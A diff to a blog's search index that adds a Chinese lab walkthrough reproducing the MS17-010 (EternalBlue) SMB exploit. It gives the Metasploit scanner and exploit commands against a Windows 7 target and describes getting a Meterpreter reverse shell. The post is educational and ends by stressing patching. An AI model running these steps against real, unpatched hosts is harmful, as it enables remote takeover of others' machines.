@@ -91,4 +91,53 @@ if(isset($_GET[&#39;file&#39;]))&#123;
         <tag>web入门_文件包含</tag>
       </tags>
   </entry>
+  <entry>
+    <title>ms17_010漏洞复现</title>
+    <url>/2022/03/06/ms17-010-fu-xian/</url>
+    <content><![CDATA[<h6 id="漏洞描述："><a href="#漏洞描述：" class="headerlink" title="漏洞描述："></a>漏洞描述：</h6><p>永恒之蓝（Eternalblue）是指2017年4月14日晚，黑客团体Shadow Brokers（影子经纪人）公布一大批网络攻击工具，其中包含“永恒之蓝”工具，“永恒之蓝”利用Windows系统的SMB漏洞可以获取系统最高权限。</p>
+<p>原理：</p>
+<p>通过TCP端口445和139来利用SMBv1和NBT中的远程代码执行漏洞，通过恶意代码扫描并攻击开放445文件共享端口的Windows主机，只要用户主机在线，即可通过该漏洞，控制用户的主机。</p>
+<p>测试环境：</p>
+<p>攻击机：kali</p>
+<p>靶机：Windows7 (ip：192.168.102.128；在被渗透过程中需全程关闭防火墙)</p>
+<p>复现过程：</p>
+<p>1.先使用nmap对目标ip进行端口扫描，查看445端口是否有开放</p>
+<p><img src="/images/ms17_010a.png"></p>
+<p>2.进入msfconsole，搜索ms17-010</p>
+<p><img src="/images/ms17_010b.png"></p>
+<p>有两个工具可以使用，auxiliary/scanner/smb/smb_ms17_010是扫描模块；exploit/windows/smb/ms17_010_eternalblue是渗透模块；一般先进行扫描，再进行渗透。</p>
+<p>3.使用扫描模块对靶机进行扫描</p>
+<pre class="line-numbers language-none"><code class="language-none">进入扫描模块
+use auxiliary&#x2F;scanner&#x2F;smb&#x2F;smb_ms17_010
+设置目标ip
+set rhosts 192.168.102.128
+开始扫描
+run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="/images/ms17_010c.png"></p>
+<p>可以发现目标ip确实存在漏洞风险</p>
+<p>4.使用渗透模块对目标进行渗透</p>
+<pre class="line-numbers language-none"><code class="language-none">进入渗透模块
+use exploit&#x2F;windows&#x2F;smb&#x2F;ms17_010_eternalblue
+查看当前模块所需参数
+show options
+设置目标ip
+set rhosts 192.168.102.128
+开始渗透
+run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="/images/ms17_010d.png"></p>
+<p>5.在执行完run后，开启了一个reverse tcp监听器来监听本地的4444端口，运行成功后会进入一个meterpreter会话，可以通过此会话来执行系统命令、提权、获取敏感信息等；输入shell后即可切换到目标主机的windows shell</p>
+<p><img src="/images/ms17_010f.png"></p>
+<p>对靶机执行相关命令，发现成功执行。</p>
+<p><img src="/images/ms17_010g.png"></p>
+<h6 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h6><p>以上便是ms17_010漏洞的复现了，过程相对简单，但却获得了极大的系统权限，由此可见系统自动更新的重要性了。</p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>ms17_010漏洞</tag>
+      </tags>
+  </entry>
 </search>
